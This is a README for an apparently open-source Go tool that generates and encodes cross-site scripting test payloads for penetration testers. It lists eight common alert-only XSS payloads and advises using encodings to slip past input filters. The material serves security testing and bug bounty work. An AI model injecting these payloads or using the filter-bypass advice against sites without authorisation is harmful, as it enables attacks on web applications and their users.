
# **XSS Payload Generator**

The **XSS Payload Generator** is a versatile and lightweight tool built with Go. It helps penetration testers and bug bounty hunters generate custom and encoded XSS payloads for testing vulnerabilities in web applications. Designed to save time and increase efficiency, this tool provides pre-defined payloads and supports multiple encoding options.

---

## **Features**
- **Predefined Payloads**:
  - A collection of common XSS payloads ready for testing.
- **Custom Payload Support**:
  - Generate encoded versions of your own payloads.
- **Multiple Encoding Options**:
  - Supports `base64`, `url`, `unicode`, and `hex` encoding.
- **Report Generation**:
  - Save generated payloads to a file for future use.
- **Lightweight and Efficient**:
  - Built with Go, ensuring speed and simplicity.

---

## **Installation**
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/YamatoGr93/XSSPayloadGenerator.git
   cd XSSPayloadGenerator
   ```

2. **Build the Tool**:
   Compile the tool into a binary:
   ```bash
   go build -o xss-payload-generator main.go
   ```

3. **Run the Tool**:
   Use the compiled binary:
   ```bash
   ./xss-payload-generator [flags]
   ```

---

## **Usage**
```bash
go run main.go [flags]
```

### **Available Flags**
| Flag             | Description                                           | Default               |
|-------------------|-------------------------------------------------------|-----------------------|
| `-o`             | File to save the generated payloads                   | `payloads.txt`        |
| `-e`             | Encoding format (`base64`, `url`, `unicode`, `hex`)   | `none`                |
| `-p`             | Custom payload to encode                              | *None*                |

---

## **Examples**

### **Generate Predefined Payloads with URL Encoding**
```bash
go run main.go -e url -o juice_payloads.txt
```
Generates URL-encoded payloads and saves them to `juice_payloads.txt`.

### **Generate Predefined Payloads Without Encoding**
```bash
go run main.go -o raw_payloads.txt
```
Generates raw payloads and saves them to `raw_payloads.txt`.

### **Encode a Custom Payload**
```bash
go run main.go -p "<script>alert('XSS')</script>" -e base64 -o custom_payloads.txt
```
Encodes the custom payload in Base64 format and saves it to `custom_payloads.txt`.

---

## **Predefined Payloads**
The tool includes the following commonly used XSS payloads:
1. `<script>alert('XSS')</script>`
2. `"><script>alert('XSS')</script>`
3. `<img src="x" onerror="alert('XSS')">`
4. `<svg onload="alert('XSS')"></svg>`
5. `<body onload="alert('XSS')">`
6. `<iframe src="javascript:alert('XSS');"></iframe>`
7. `<link rel="stylesheet" href="javascript:alert('XSS')">`
8. `<div style="background-image: url('javascript:alert("XSS"));'></div>`

---

## **Planned Enhancements**
Future updates may include:
1. **Dynamic Integration**:
   - Automate testing by integrating payloads directly with web application endpoints.
2. **Context-Specific Payload Generation**:
   - Generate payloads optimized for attributes, HTML body, or JavaScript injection.
3. **Additional Encoding Formats**:
   - Add support for more advanced encoding formats to bypass modern filters.

---

## **Performance Tips**
- Test payloads in fields where user input is reflected without sanitization.
- Use encoding options to bypass certain input filters.
- Save payloads to a file for future use in bug bounty hunting.

---

## **License**
This project is licensed under the MIT License. See `LICENSE` for more details.

---

## **Acknowledgments**
- Inspired by OWASP Juice Shop for testing.
- Built with Go to showcase skills in development and penetration testing.
